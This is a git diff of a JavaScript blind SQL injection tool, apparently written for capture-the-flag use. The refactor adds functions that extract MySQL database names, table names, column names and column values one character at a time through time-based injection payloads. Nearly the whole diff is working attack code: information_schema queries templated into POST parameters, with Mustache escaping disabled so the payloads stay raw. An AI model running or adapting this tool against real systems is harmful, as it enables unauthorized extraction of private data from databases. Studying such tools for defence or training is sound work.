@@ -1,13 +1,6 @@
-// const post = (url, param, payload) => {
-// 	console.log(payload);
-// 	const data = new URLSearchParams();
-// 	data.append(param, payload);
-// 	return fetch(url, {
-// 		method: 'POST',
-// 		body: data
-// 	});
-// };
-const util = require('util');
+const Mustache = require('mustache');
+
+Mustache.escape = text => text;
 
 const blindPost = async (url, params) => {
     const timeout = 1;
@@ -32,141 +25,174 @@ const blindPost = async (url, params) => {
 class SQLi {
     constructor(options) {
         console.log(options);
+        this.db = options.db;
         this.url = options.url;
         this.data = options.data;
         this.type = options.type;
         this.query = options.query;
+        this.table = options.table;
+        this.column = options.column;
         this.method = options.method;
         this.timeout = options.timeout;
     }
 
-    async getDatabasesCount() {
-        const injectable = SQLi.getInjectableParam(this.data);
+    async iterate(query, params, numbers = [...Array(100).keys()]) {
+        let target = null;
 
-        const query = this.query.replace(
-            'CATPANTS',
-            "(SELECT count(DISTINCT(schema_name)) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') ORDER BY schema_name)=%i"
-        );
+        for (let number of numbers) {
+            const payload = Mustache.render(this.data, {
+                timeout: this.timeout,
+                column: this.column,
+                table: this.table,
+                db: this.db,
+                number,
+                ...params
+            }, {
+                query
+            });
 
-        let databasesCount = 0;
-
-        for (let i = 0; i < 100; i += 1) {
-            const payload = util.format(query, i, this.timeout);
-            const data = new URLSearchParams(this.data);
-            const value = data.get(injectable).replace('{CATPANTS}', payload);
-            data.set(injectable, value);
-            console.log(value);
+            console.log(payload);
+            const data = new URLSearchParams(payload);
             const match = await blindPost(this.url, data);
 
             if (match) {
-                databasesCount = i;
+                target = number;
                 break;
             }
         }
 
-        return databasesCount;
-    }
-
-    async getDatabasesList(count) {
-        const databaseNames = [];
-
-        for (let i = 0; i < count; i += 1) {
-            const databaseName = await this.getDatabaseName(i);
-            databaseNames.push(databaseName);
+        if (target === null) {
+            throw new Error('Can\'t match the number');
         }
 
-        return databaseNames;
+        return target;
     }
 
-    async getDatabaseName(index) {
-        const codes = [...Array(10).keys()].map(i => i + 48)
-            .concat([...Array(31).keys()].map(i => i + 95));
-        const databaseNameChars = []
+    async getObjectName(lengthQuery, charQuery, rowIndex) {
+        const objectNameChars = [];
+        const objectNameLength = await this.iterate(lengthQuery, { rowIndex });
+        console.log(`Object #${rowIndex} name length:`, objectNameLength);
 
-        const databaseNameLength = await this.getDatabaseNameLength(index);
-        console.log(`Database #${index} name length:`, databaseNameLength);
+        for (let charIndex = 1; charIndex <= objectNameLength; charIndex += 1) {
+            const code = await this.iterate(
+                charQuery, {
+                    rowIndex,
+                    charIndex
+                },
+                SQLi.CHAR_CODES
+            );
 
-        for (let i = 1; i <= databaseNameLength; i += 1) {
-            for (let code of codes) {
-                const injectable = SQLi.getInjectableParam(this.data);
-
-                const query = this.query.replace(
-                    'CATPANTS',
-                    "ascii(substring((SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') LIMIT %i,1),%i,1))=%i"
-                );
-
-                const payload = util.format(query, index, i, code, this.timeout);
-                const data = new URLSearchParams(this.data);
-                const value = data.get(injectable).replace('{CATPANTS}', payload);
-                data.set(injectable, value);
-                console.log(value);
-                const match = await blindPost(this.url, data);
-    
-                if (match) {
-                    databaseNameChars.push(String.fromCharCode(code));
-                    break;
-                }
-            }
+            objectNameChars.push(String.fromCharCode(code));
         }
 
-        return databaseNameChars.join('');
+        const objectName = objectNameChars.join('');
+        console.log(`Object #${rowIndex}:`, objectName);
+        return objectName;
     }
 
-    async getDatabaseNameLength(index) {
-        const injectable = SQLi.getInjectableParam(this.data);
+    static CHAR_CODES = [...Array(10).keys()].map(i => i + 48)
+        .concat([...Array(31).keys()].map(i => i + 95))
+        .concat(['{'.charCodeAt(0), '}'.charCodeAt(0), '-'.charCodeAt(0)]);
 
-        const query = this.query.replace(
-            'CATPANTS',
-            "length((SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') LIMIT %i,1))=%i"
-        );
-
-        let databaseNameLength = 0;
-
-        for (let i = 1; i < 100; i += 1) {
-            const payload = util.format(query, index, i, this.timeout);
-            const data = new URLSearchParams(this.data);
-            const value = data.get(injectable).replace('{CATPANTS}', payload);
-            data.set(injectable, value);
-            console.log(value);
-            const match = await blindPost(this.url, data);
-
-            if (match) {
-                databaseNameLength = i;
-                break;
-            }
-        }
-
-        return databaseNameLength;
-    }
-
-    static getInjectableParam(data) {
-        const params = new URLSearchParams(data);
-        let injectable = null;
-
-        for (const [key, value] of params.entries()) {
-            if (value.includes('{CATPANTS}')) {
-                injectable = key;
-            }
-        }
-
-        if (!injectable) {
-            throw new Error('Can\'t find injectable param with value "CATPANTS"')
-        }
-
-        return injectable;
-    }
-
-    static async dumpDbs(options) {
+    static async dumpDbNames(options) {
         const sqli = new SQLi(options);
-        const databasesCount = await sqli.getDatabasesCount();
+        const databasesCount = await sqli.iterate(
+            "(SELECT count(DISTINCT(schema_name)) FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') ORDER BY schema_name)={{number}}"
+        );
 
         if (databasesCount === 0) {
             throw new Error('Can\'t get databases count');
         }
 
         console.log('Databases count: ', databasesCount);
-        const databases = await sqli.getDatabasesList(databasesCount);
-        console.log(databases);
+        const databaseNames = [];
+
+        for (let rowIndex = 0; rowIndex < databasesCount; rowIndex += 1) {
+            const databaseName = await sqli.getObjectName(
+                "length((SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') LIMIT {{rowIndex}},1))={{number}}",
+                "ascii(substring((SELECT DISTINCT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema', 'performance_schema', 'mysql') LIMIT {{rowIndex}},1),{{charIndex}},1))={{number}}",
+                rowIndex
+            );
+            databaseNames.push(databaseName);
+        }
+
+        console.log(databaseNames);
+    }
+
+    static async dumpTableNames(options) {
+        const sqli = new SQLi(options);
+        const tablesCount = await sqli.iterate(
+            "(SELECT count(DISTINCT(table_name)) FROM information_schema.tables WHERE table_schema='{{db}}')={{number}}"
+        );
+
+        if (tablesCount === 0) {
+            throw new Error('Can\'t get tables count');
+        }
+
+        console.log('Tables count: ', tablesCount);
+        const tableNames = [];
+
+        for (let rowIndex = 0; rowIndex < tablesCount; rowIndex += 1) {
+            const tableName = await sqli.getObjectName(
+                "length((SELECT DISTINCT table_name FROM information_schema.tables WHERE table_schema='{{db}}' LIMIT {{rowIndex}},1))={{number}}",
+                "ascii(substring((SELECT DISTINCT table_name FROM information_schema.tables WHERE table_schema='{{db}}' LIMIT {{rowIndex}},1),{{charIndex}},1))={{number}}",
+                rowIndex
+            );
+            tableNames.push(tableName);
+        }
+
+        console.log(tableNames);
+    }
+
+    static async dumpColumnNames(options) {
+        const sqli = new SQLi(options);
+        const columnsCount = await sqli.iterate(
+            "(SELECT count(DISTINCT(column_name)) FROM information_schema.columns WHERE table_schema='{{db}}' AND table_name='{{table}}')={{number}}"
+        );
+
+        if (columnsCount === 0) {
+            throw new Error('Can\'t get columns count');
+        }
+
+        console.log('Tables count: ', columnsCount);
+        const columnNames = [];
+
+        for (let rowIndex = 0; rowIndex < columnsCount; rowIndex += 1) {
+            const columnName = await sqli.getObjectName(
+                "length((SELECT DISTINCT column_name FROM information_schema.columns WHERE table_schema='{{db}}' AND table_name='{{table}}' LIMIT {{rowIndex}},1))={{number}}",
+                "ascii(substring((SELECT DISTINCT column_name FROM information_schema.columns WHERE table_schema='{{db}}' AND table_name='{{table}}' LIMIT {{rowIndex}},1),{{charIndex}},1))={{number}}",
+                rowIndex
+            );
+            columnNames.push(columnName);
+        }
+
+        console.log(columnNames);
+    }
+
+    static async dumpTableColumn(options) {
+        const sqli = new SQLi(options);
+        const rowsCount = await sqli.iterate(
+            "(SELECT count({{column}}) FROM {{table}})={{number}}"
+        );
+
+        if (rowsCount === 0) {
+            throw new Error('Can\'t get rows count');
+        }
+
+        console.log('Rows count: ', rowsCount);
+        const columnNames = [];
+
+        for (let rowIndex = 0; rowIndex < rowsCount; rowIndex += 1) {
+            const columnName = await sqli.getObjectName(
+                "length((SELECT {{column}} FROM {{table}} LIMIT {{rowIndex}},1))={{number}}",
+                "ascii(substring((SELECT {{column}} FROM {{table}} LIMIT {{rowIndex}},1),{{charIndex}},1))={{number}}",
+                rowIndex
+            );
+
+            columnNames.push(columnName);
+        }
+
+        console.log(columnNames);
     }
 }
 
